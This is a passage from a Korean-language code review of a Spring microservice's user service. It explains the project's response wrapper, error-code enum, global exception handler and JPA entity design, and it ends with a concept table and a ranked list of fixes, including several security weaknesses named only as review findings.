// getRegisteredAnimals()
if (user.getRole() != Role.ROLE_SHELTER) {
    throw new UnauthorizedException("보호소 직원만 조회할 수 있습니다.");
}
```

게이트웨이가 인가를 담당하는데도 서비스 내부에서 한 번 더 확인합니다.
**이건 잘한 것입니다.** "내가 등록한 동물"은 보호소 회원만 의미가 있고, 이 규칙은
경로 패턴으로 표현하기 어려운 **도메인 규칙**입니다.
게이트웨이는 "경로 단위 인가"를, 서비스는 "데이터 소유권 검증"을 하는 분담이 자연스럽습니다.

> 💡 실제로 이 방식을 다른 서비스에도 확장하면 [02-api-gateway.md](02-api-gateway.md#6-2-인가-목록과-경로-리라이트가-엇갈려서-생긴-실제-구멍)의
> 게이트웨이 인가 구멍이 이중 방어로 막힙니다. `X-User-Role` 헤더가 이미 전달되고 있으니
> 컨트롤러에서 `@RequestHeader("X-User-Role")`로 받아 확인할 수 있습니다.

---

## 10. 공통 응답·예외 규약

이 프로젝트에서 **다른 서비스로 전파된 규약**입니다.

### 응답 포맷 통일

[util/ResponseDTO.java](../user-service/src/main/java/com/pawbridge/userservice/util/ResponseDTO.java)

```java
public class ResponseDTO<T> {
    private final int code;
    private final String message;
    private final T data;

    public static ResponseDTO<Void> ok()                              { ... }
    public static ResponseDTO<Void> okWithMessage(String message)      { ... }
    public static <T> ResponseDTO<T> okWithData(T data)                { ... }
    public static <T> ResponseDTO<T> okWithData(T data, String msg)    { ... }
    public static ResponseDTO<Void> error(ErrorCode errorCode)         { ... }
}
```

**모든 응답이 같은 껍데기를 씁니다.** 프론트엔드는 `res.data.data`로 본문을 꺼내고 `res.data.message`를
토스트로 띄우는 처리를 **한 번만** 작성합니다. API마다 모양이 다르면 화면마다 분기가 생깁니다.

`private` 생성자 + `@Builder` + 정적 팩토리 메서드 조합도 의도적입니다.
`new ResponseDTO(...)`를 막고 이름 있는 메서드만 열어두면 **사용법이 좁아져 실수가 줄어듭니다.**

### ErrorCode enum — 에러 카탈로그

[exception/common/ErrorCode.java](../user-service/src/main/java/com/pawbridge/userservice/exception/common/ErrorCode.java)

```java
public enum ErrorCode {
    USER_NOT_FOUND(HttpStatus.BAD_REQUEST, "존재하지 않는 회원입니다."),
    TOKEN_EXPIRED(HttpStatus.UNAUTHORIZED, "토큰이 만료되었습니다."),
    NICKNAME_DUPLICATE(HttpStatus.CONFLICT, "이미 사용 중인 닉네임입니다."),
    TOO_MANY_SEND_ATTEMPTS(HttpStatus.TOO_MANY_REQUESTS, "인증 코드 발송 횟수를 초과했습니다..."),
    ...  // 40개 이상
}
```

**HTTP 상태 코드와 사용자 메시지를 한 자리에 묶었습니다.** 얻는 것:

- 에러 메시지가 코드 곳곳에 흩어지지 않습니다. 문구 수정이 한 파일에서 끝납니다.
- **같은 성격의 에러가 같은 상태 코드를 갖습니다.** 중복은 409, 인증 실패는 401, 횟수 초과는 429.
  이게 흔들리면 프론트 처리가 어려워집니다.
- 전체 목록을 한눈에 볼 수 있어 새 에러를 추가할 때 기존 것을 재사용하기 쉽습니다.

`TOO_MANY_REQUESTS(429)`를 정확히 쓴 것이 눈에 띕니다. 많은 프로젝트가 이걸 400으로 뭉갭니다.

### 예외 클래스 30개 + 전역 핸들러

```java
// ApplicationException — 모든 도메인 예외의 부모
public class ApplicationException extends RuntimeException {
    private final ErrorCode errorCode;
}

// 개별 예외는 ErrorCode만 지정
public class UserNotFoundException extends ApplicationException {
    public UserNotFoundException() { super(ErrorCode.USER_NOT_FOUND); }
}
```

```java
@RestControllerAdvice
public class GlobalExceptionRestAdvice {
    @ExceptionHandler
    public ResponseEntity<ResponseDTO<Void>> applicationException(ApplicationException e) {
        return ResponseEntity.status(e.getErrorCode().getHttpStatus())
                             .body(ResponseDTO.error(e.getErrorCode()));
    }
    // BindException, MethodArgumentNotValidException, DataAccessException,
    // NoHandlerFoundException, RuntimeException ... 각각 처리
}
```

**서비스 코드가 깨끗해집니다.**

```java
// 서비스에서는 그냥 던진다
User user = userRepository.findById(userId).orElseThrow(UserNotFoundException::new);
// try-catch도, ResponseEntity 조립도 없다 → 전역 핸들러가 알아서 400 + 메시지로 변환
```

부모 클래스 하나(`ApplicationException`)만 잡으면 자식 30개가 모두 처리되는 것이
이 설계의 핵심입니다. 새 예외를 추가할 때 핸들러를 고칠 필요가 없습니다.

⚠️ **한 가지 지적**: `MethodArgumentNotValidException` 핸들러가 필드 오류를 전부 이어 붙입니다.

```java
String errorMessage = String.join(", ", fieldErrors);
// → "email: 형식이 올바르지 않습니다, password: 8자 이상이어야 합니다"
```

프론트가 **어느 입력창에 빨간 줄을 칠지 알 수 없습니다.** 필드별로 구조화해 주는 편이 좋습니다.

```java
// data에 필드→메시지 Map을 담으면 프론트가 입력창별로 표시할 수 있다
Map<String, String> errors = bindingResult.getFieldErrors().stream()
        .collect(toMap(FieldError::getField, FieldError::getDefaultMessage, (a,b)->a));
```

---

## 11. 엔티티 설계에서 배울 점

### `@EntityListeners(AuditingEntityListener.class)` — 시간 자동 기록

```java
@EntityListeners(AuditingEntityListener.class)
public class User {
    @CreatedDate      private LocalDateTime createdAt;
    @LastModifiedDate private LocalDateTime updatedAt;
}
```

`createdAt`을 손으로 넣으면 어느 코드 경로에서 빠뜨립니다. JPA Auditing은 저장/수정 시점에 자동으로
채웁니다. `@CreatedDate` 필드에 `updatable = false`를 붙인 것도 정확합니다 — 수정 시 생성 시각이
덮어써지는 사고를 막습니다.

> ⚠️ 이것도 **`@EnableJpaAuditing`이 있어야 동작합니다.** 없으면 `createdAt`이 조용히 null로 남습니다.

### `@ManyToOne(fetch = FetchType.LAZY)` — 왜 항상 LAZY인가

```java
@ManyToOne(fetch = FetchType.LAZY)
@JoinColumn(name = "user_id", ...)
private User user;
```

`EAGER`(기본값)면 `Favorite`을 조회할 때마다 `User`를 **항상 함께 JOIN**합니다.
찜 목록 30개를 가져오면 필요 없는 User 30개까지 끌고 옵니다.
`LAZY`는 `favorite.getUser()`를 실제로 호출할 때만 조회합니다.

**MSA에서는 이유가 하나 더 있습니다.** 지연 로딩된 프록시를 트랜잭션 밖에서 건드리면
`LazyInitializationException`이 납니다. 그래서 config repo의 공통 설정에 이게 있습니다:

```yaml
spring:
  jpa:
    open-in-view: false     # ★
```

`open-in-view`(기본 true)는 **뷰 렌더링이 끝날 때까지 DB 커넥션을 붙잡습니다.** 편하지만
커넥션 점유 시간이 길어져 부하 시 커넥션 풀이 마릅니다. `false`로 끄면 지연 로딩 문제가 컴파일
단계가 아니라 테스트에서 드러나므로, **DTO 변환을 트랜잭션 안에서 끝내는 습관**이 강제됩니다.
이 프로젝트는 실제로 서비스 계층에서 `fromEntity()`로 DTO를 만들고 반환합니다. 일관성이 있습니다.

### 외래키를 SQL로 직접 지정한 부분

```java
@JoinColumn(name = "user_id", nullable = false,
        foreignKey = @ForeignKey(
                name = "fk_favorites_user",
                foreignKeyDefinition = "FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE RESTRICT"
        ))
```

`ON DELETE RESTRICT`는 **"자식 행이 있으면 부모를 못 지운다"** 는 뜻입니다.
찜이 남아 있는 사용자를 삭제하려 하면 DB가 거부합니다.

**왜 이렇게까지 하나** — 애플리케이션 코드로만 막으면, 관리자가 콘솔에서 직접 DELETE하거나
다른 경로가 추가될 때 고아 데이터가 생깁니다. **DB 제약은 어떤 경로로 들어와도 지켜집니다.**

⚠️ 다만 `UserServiceImpl.deleteUserById()`는 `userRepository.deleteById(userId)`를 그냥 호출합니다.
찜이 있는 회원을 관리자가 삭제하면 **`DataIntegrityViolationException` → 500 에러**가 납니다.
`ErrorCode`에 `USER_DELETION_FAILED`가 이미 정의되어 있으니 그걸 쓰거나, 찜을 먼저 정리해야 합니다.

### 정적 팩토리 메서드 — 생성 방법을 이름으로 구분

```java
public static User createLocalUser(String email, String name, String password, String nickname, ...)
public static User createSocialUser(String email, String name, String provider, String providerId, ...)
```

두 방식은 채우는 필드가 다릅니다(LOCAL은 password, SOCIAL은 providerId).
생성자를 두 개 만들면 파라미터 순서만 다른 헷갈리는 API가 되지만, 이름을 주면 의도가 드러나고
**잘못된 조합을 애초에 만들 수 없습니다.**

### 엔티티에 setter가 없다

```java
public void updateNickname(String nickname) { this.nickname = nickname; }
public void updatePassword(String newPassword) { this.password = newPassword; }
public void updateRole(Role role) { this.role = role; }
```

`@Setter`를 붙이지 않고 **의미 있는 이름의 메서드만** 열었습니다.
`user.setRole(...)`은 아무 데서나 호출될 수 있지만 `updateRole`은 "관리자용"이라는 주석과 함께
찾기 쉽습니다. **변경 가능한 지점을 좁히는 것**이 엔티티 설계의 기본입니다.

---

## 12. 이 문서에서 배울 개념 총정리

| 개념 | 한 줄 설명 | 코드 위치 |
|---|---|---|
| **BCrypt** | 의도적으로 느린 해시 + 자동 salt | `SecurityConfig` |
| **check-then-act 경쟁** | 확인과 저장 사이의 틈은 DB 제약으로만 막는다 | `UserServiceImpl.signUp` |
| **Redis TTL** | 자동 소멸이 필요한 데이터에 최적 | `EmailVerificationService` |
| **Lua 스크립트 원자성** | Redis 단일 스레드 + 스크립트 = 원자적 실행 | `RedisConfig` ★ |
| **분산 Rate Limiting** | 서버가 늘어도 Redis 하나로 정확히 센다 | `checkAndIncrementSendCount` |
| **Security 필터 상속** | AuthenticationManager 재사용, 훅만 구현 | `JwtAuthenticationFilter` |
| **user enumeration** | "없는 계정" vs "틀린 비밀번호"를 구분해 알리면 안 된다 | ⚠️ 로그인 실패 메시지 |
| **Access/Refresh 분리** | 자주 쓰는 건 stateless, 위험한 건 stateful | `JwtProvider` |
| **Token Rotation** | 재발급 시 refresh도 교체 → 탈취 창 축소 | `AuthServiceImpl` |
| **`jti` 필요성** | 내용이 같은 JWT는 문자열도 같다 | 🚨 `createRefreshToken` |
| **HttpOnly 쿠키** | JS가 못 읽음 → XSS 탈취 차단 | `CookieUtil` |
| **SameSite** | 다른 사이트 요청에 쿠키를 붙일지 → CSRF 방어 | `CookieUtil` |
| **OAuth2 Authorization Code** | 브라우저에 토큰을 노출하지 않는 교환 절차 | `oauth2/` |
| **복합 유니크 `(email, provider)`** | 같은 이메일로 LOCAL/GOOGLE 공존 허용 | `User` |
| **Dual Write 문제** | DB와 Kafka를 각각 쓰면 원자성이 깨진다 | 8-2 |
| **Transactional Outbox** | "DB에 두 번 쓰기"로 바꿔 원자성 확보 | 8-3 ★ |
| **CDC / binlog** | DB 변경 로그를 이벤트 스트림으로 활용 | 8-3 |
| **트랜잭션 전파** | `REQUIRES_NEW`는 별도 커밋 → Outbox를 깬다 | 🚨 8-5 |
| **at-least-once & 멱등성** | 중복 수신 전제 → eventId로 걸러낸다 | `ProcessedEvent` |
| **JPA 쓰기 지연** | `save()`가 SQL을 보내지 않아 catch가 무력해진다 | ⚠️ 8-8 |
| **SAGA 보상 트랜잭션** | 롤백 불가 → 반대 작업으로 되돌린다 | `CompensationEventHandler` |
| **Kafka 오프셋 수동 커밋** | 처리 성공 후 커밋 → 유실 대신 재시도 | `KafkaConsumerConfig` |
| **BFF** | 프론트 화면 단위로 서버가 데이터를 조합 | `MyPageServiceImpl` |
| **Feign** | HTTP 호출을 인터페이스 선언으로 | `client/` |
| **N+1 네트워크 호출** | 반복 HTTP는 batch 엔드포인트로 | `getFavorites` |
| **Graceful Degradation** | 일부 실패 시 부분 응답으로 버틴다 | `ofWithoutAnimal` |
| **전역 예외 처리** | 부모 예외 하나로 자식 전부 처리 | `GlobalExceptionRestAdvice` |
| **JPA Auditing** | 생성/수정 시각 자동 기록 | `@CreatedDate` |
| **`open-in-view: false`** | 커넥션 조기 반납 + DTO 변환 습관 강제 | config repo |

---

## 13. 개선 우선순위

| 순위 | 항목 | 심각도 | 근거 |
|---|---|---|---|
| 1 | 🚨 `createRefreshToken()`에 `jti` 추가 | **높음** | 같은 초 로그인 시 500 에러 / 최악의 경우 계정 혼동 (4절) |
| 2 | 🚨 `OutboxServiceImpl`의 `REQUIRES_NEW` 제거 | **높음** | Outbox 원자성 붕괴 → 유령 이벤트 (8-5) |
| 3 | 보상 이벤트 실패 시 ack 하지 말고 DLT로 | **높음** | 마지막 방어선이 조용히 유실됨 (8-9) |
| 4 | `ProcessedEvent` 저장을 `saveAndFlush`로 | 중간 | 중복 방어 try-catch가 무력함 (8-8) |
| 5 | 쿠키 `Secure`를 프로필 문자열 대신 설정값으로 | 중간 | dev 프로필이라 운영에서 `Secure` 누락 (5절) |
| 6 | 로그인 실패 메시지 통일 | 중간 | user enumeration (3절) |
| 7 | 이메일 발송 제한에 IP 기준 추가 | 중간 | 이메일만 바꾸면 우회 가능 (7절) |
| 8 | 검증 시도 제한도 Lua로 원자화 | 낮음 | 발송 쪽 해법을 그대로 쓰면 됨 (2절) |
| 9 | 마이페이지도 부분 응답으로 | 낮음 | 찜 목록 쪽 방식으로 통일 (9절) |
| 10 | 이벤트 페이로드를 `Map` → DTO 클래스로 | 낮음 | 오타를 컴파일러가 잡게 (8-7) |
| 11 | `ObjectMapper` 주입받은 것 사용 | 낮음 | 불필요한 객체 생성 (8-6) |
| 12 | 회원가입 시 GOOGLE 계정 존재 확인 추가 | 낮음 | 충돌 검사가 한 방향뿐 (6절) |

**테스트를 하나만 쓴다면**: 8-5의 "롤백 시 outbox에 남지 않는다" 테스트를 권합니다.
이 프로젝트에서 가장 중요한 패턴의 가장 중요한 성질을 검증하고, **현재 코드는 이 테스트에서 실패합니다.**

---

**다음 문서** → [04-animal-service.md](04-animal-service.md) — 배치, 공공데이터, Elasticsearch, 그리고 올바르게 구현된 Kafka 소비자
